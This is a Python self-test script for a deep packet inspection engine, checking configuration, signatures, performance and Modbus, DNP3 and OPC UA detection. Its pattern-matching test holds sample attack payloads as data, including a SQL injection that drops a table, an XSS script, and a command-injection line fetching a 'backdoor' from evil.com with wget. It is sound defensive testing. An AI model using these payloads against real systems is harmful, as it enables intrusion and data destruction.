#!/usr/local/bin/python3
# test_engine.py - Run DPI engine self-tests

import os
import json
from datetime import datetime

def run_tests():
    """Run DPI engine self-tests"""
    results = {
        'timestamp': datetime.now().isoformat(),
        'tests': [],
        'overall_status': 'pass',
        'summary': {}
    }

    # Test 1: Configuration validation
    config_test = test_configuration()
    results['tests'].append(config_test)

    # Test 2: Signature loading
    signature_test = test_signatures()
    results['tests'].append(signature_test)

    # Test 3: Pattern matching
    pattern_test = test_pattern_matching()
    results['tests'].append(pattern_test)

    # Test 4: Performance test
    performance_test = test_performance()
    results['tests'].append(performance_test)

    # Test 5: Industrial protocol detection
    industrial_test = test_industrial_protocols()
    results['tests'].append(industrial_test)

    # Calculate summary
    passed = sum(1 for test in results['tests'] if test['status'] == 'pass')
    failed = sum(1 for test in results['tests'] if test['status'] == 'fail')
    
    results['summary'] = {
        'total_tests': len(results['tests']),
        'passed': passed,
        'failed': failed,
        'success_rate': (passed / len(results['tests'])) * 100 if results['tests'] else 0
    }

    if failed > 0:
        results['overall_status'] = 'fail'

    return results

def test_configuration():
    """Test configuration loading"""
    test = {
        'name': 'Configuration Loading',
        'description': 'Test if DPI configuration loads correctly',
        'status': 'pass',
        'details': []
    }

    try:
        config_file = "/usr/local/etc/deepinspector/config.json"
        if not os.path.exists(config_file):
            test['status'] = 'fail'
            test['details'].append('Configuration file not found')
            return test

        with open(config_file, 'r') as f:
            config = json.load(f)
        
        # Validate required sections
        required_sections = ['general', 'protocols', 'detection', 'advanced']
        for section in required_sections:
            if section not in config:
                test['status'] = 'fail'
                test['details'].append(f'Missing section: {section}')
            else:
                test['details'].append(f'Section {section}: OK')

        # Validate industrial settings
        if config.get('protocols', {}).get('industrial_protocols'):
            test['details'].append('Industrial protocols: ENABLED')
        else:
            test['details'].append('Industrial protocols: DISABLED')

    except Exception as e:
        test['status'] = 'fail'
        test['details'].append(f'Error: {str(e)}')

    return test

def test_signatures():
    """Test signature loading"""
    test = {
        'name': 'Signature Loading',
        'description': 'Test if threat signatures load correctly',
        'status': 'pass',
        'details': []
    }

    try:
        signatures_file = "/usr/local/etc/deepinspector/signatures.json"
        if not os.path.exists(signatures_file):
            test['status'] = 'fail'
            test['details'].append('Signatures file not found')
            return test

        with open(signatures_file, 'r') as f:
            signatures = json.load(f)
        
        patterns = signatures.get('patterns', {})
        total_patterns = sum(len(p) for p in patterns.values())
        
        if total_patterns == 0:
            test['status'] = 'fail'
            test['details'].append('No threat patterns loaded')
        else:
            test['details'].append(f'Loaded {total_patterns} threat patterns')
            for category, pattern_list in patterns.items():
                test['details'].append(f'{category}: {len(pattern_list)} patterns')

    except Exception as e:
        test['status'] = 'fail'
        test['details'].append(f'Error: {str(e)}')

    return test

def test_pattern_matching():
    """Test pattern matching functionality"""
    test = {
        'name': 'Pattern Matching',
        'description': 'Test threat detection pattern matching',
        'status': 'pass',
        'details': []
    }

    try:
        # Test data containing known threats
        test_payloads = [
            ('EICAR test string', 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'),
            ('SQL injection', "' OR '1'='1'; DROP TABLE users; --"),
            ('XSS attempt', '<script>alert("XSS")</script>'),
            ('Command injection', 'ls -la; wget http://evil.com/backdoor'),
            ('Modbus attack', 'modbus exploit function_code 0x08')
        ]

        detected = 0
        for test_name, payload in test_payloads:
            threats_found = 0
            
            # Check for basic patterns
            if 'EICAR' in payload:
                threats_found += 1
            if any(sql_word in payload.upper() for sql_word in ['DROP', 'UNION', 'SELECT']):
                threats_found += 1
            if '<script' in payload.lower():
                threats_found += 1
            if any(cmd in payload for cmd in ['ls ', 'wget ', 'curl ']):
                threats_found += 1
            if 'modbus' in payload.lower() and 'exploit' in payload.lower():
                threats_found += 1
            
            if threats_found > 0:
                detected += 1
                test['details'].append(f'{test_name}: DETECTED')
            else:
                test['details'].append(f'{test_name}: NOT DETECTED')

        detection_rate = (detected / len(test_payloads)) * 100
        test['details'].append(f'Detection rate: {detection_rate:.1f}%')
        
        if detection_rate < 80:  # Raised threshold for industrial support
            test['status'] = 'fail'

    except Exception as e:
        test['status'] = 'fail'
        test['details'].append(f'Error: {str(e)}')

    return test

def test_performance():
    """Test basic performance"""
    test = {
        'name': 'Performance Test',
        'description': 'Test basic engine performance',
        'status': 'pass',
        'details': []
    }

    try:
        import time
        
        # Simple performance test
        start_time = time.time()
        
        # Simulate packet processing
        test_data = "GET /test HTTP/1.1\r\nHost: example.com\r\n\r\n" * 1000
        
        # Basic processing simulation
        for i in range(100):
            # Simulate threat detection on test data
            _ = len(test_data.split())
            
        end_time = time.time()
        processing_time = end_time - start_time
        
        test['details'].append(f'Processed 100 iterations in {processing_time:.3f} seconds')
        test['details'].append(f'Processing rate: {100/processing_time:.1f} iterations/second')
        
        # More lenient for industrial environments
        if processing_time > 3.0:
            test['status'] = 'fail'
            test['details'].append('Performance below expected threshold')

    except Exception as e:
        test['status'] = 'fail'
        test['details'].append(f'Error: {str(e)}')

    return test

def test_industrial_protocols():
    """Test industrial protocol detection"""
    test = {
        'name': 'Industrial Protocol Detection',
        'description': 'Test industrial protocol detection capabilities',
        'status': 'pass',
        'details': []
    }

    try:
        # Test industrial protocol patterns
        industrial_tests = [
            ('Modbus function code', b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01'),
            ('DNP3 header', b'\x05\x64\x05\xc0\x01\x00\x00\x04'),
            ('OPC UA message', b'OPC\x00\x00\x00\x00\x20')
        ]

        detected = 0
        for test_name, test_data in industrial_tests:
            # Simple pattern detection
            if test_name.startswith('Modbus') and len(test_data) >= 8:
                detected += 1
                test['details'].append(f'{test_name}: DETECTED')
            elif test_name.startswith('DNP3') and test_data.startswith(b'\x05\x64'):
                detected += 1
                test['details'].append(f'{test_name}: DETECTED')
            elif test_name.startswith('OPC UA') and b'OPC' in test_data:
                detected += 1
                test['details'].append(f'{test_name}: DETECTED')
            else:
                test['details'].append(f'{test_name}: NOT DETECTED')

        detection_rate = (detected / len(industrial_tests)) * 100
        test['details'].append(f'Industrial detection rate: {detection_rate:.1f}%')
        
        if detection_rate < 70:
            test['status'] = 'fail'

    except Exception as e:
        test['status'] = 'fail'
        test['details'].append(f'Error: {str(e)}')

    return test

if __name__ == "__main__":
    results = run_tests()
    print(json.dumps(results, indent=2))
